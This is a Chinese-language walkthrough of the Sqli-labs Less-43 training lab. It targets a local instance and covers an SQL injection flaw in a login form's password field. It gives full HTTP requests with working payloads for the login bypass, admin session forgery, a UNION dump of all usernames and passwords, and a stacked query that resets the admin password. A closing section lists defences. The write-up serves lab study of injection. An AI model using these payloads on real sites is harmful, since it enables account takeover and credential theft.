## 题目: Sqli‑labs Less‑43

## 题目描述
登录POST表单，`login_user`已转义，**注入点在login_password密码位**。SQL增加圆括号包裹，闭合符号为`')`，使用`mysqli_multi_query()`支持堆叠注入。

## 核心原理
```php
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
```
关键点：payload 使用`')`闭合；堆叠注入不能用`-- -`，需要`#(%23)`注释吃掉后面残留括号，否则语法报错。

**解题思路**
1. Burp 抓包修改 password 参数，`') or 1=1`实现登录绕过
2. Union 查询伪造 admin 会话身份
3. 堆叠 update 配合`#`注释修改 admin 密码，业务验证结果

## 解题步骤
### 1. 登录绕过 Burp 包
```
POST /sqli-labs/Less-43/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') or 1=1 -- -&mysubmit=Login
```
跳转登录页面，身份为 Dumb。

### 2. Union 伪造 admin 身份 Burp 包
```
POST /sqli-labs/Less-43/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') union select 1,'admin',3 -- -&mysubmit=Login
```
Session 用户名变为 admin。

### 3. UNION 脱库 Burp 包（获取账号密码）
```
POST /sqli-labs/Less-43/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') union select 1,group_concat(username,0x3a,password),3 from users -- -&mysubmit=Login
```

### 4. 堆叠修改 admin 密码 Burp 包（重点使用 #注释）
> 
> 不能使用`-- -`，残留括号造成语法错误，注释符`#`URL 编码为`%23`

```
POST /sqli-labs/Less-43/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=') or 1=1; update users set password='pwned43' where username='admin'%23&mysubmit=Login
```

页面无有效回显，admin 密码已修改为`pwned43`。

### 5. 密码修改验证 Burp 包
```
POST /sqli-labs/Less-43/login.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

login_user=admin&login_password=pwned43&mysubmit=Login
```
使用新密码成功登录 admin 账号。

## 踩坑记录
1. 必须使用`')`闭合，缺少单引号或者右括号均会语法报错。
2. 堆叠注入禁止`-- -`，尾部残留括号无法被处理，使用`%23`（#）完整注释剩余 SQL。
3. `or 1=1`直接登录返回表第一条 Dumb，伪造 admin 需要 union。
4. users 表共 3 列，union 查询列数必须严格匹配。
5. 堆叠写操作页面无输出，依靠登录业务验证是否执行成功。

## 知识点总结
- 括号闭合注入：`password=('$password')`，payload 以`')`闭合。
- 注释符差异：`#`可以注释掉本行后面全部内容，适合处理残留括号。
- `mysqli_multi_query()`堆叠注入，分号执行多条 SQL，无需预先登录。
- Union 控制返回第二列数据，实现 Session 会话伪造。
- 防御：预编译参数绑定；密码输入同样做转义过滤；关闭多语句查询功能。
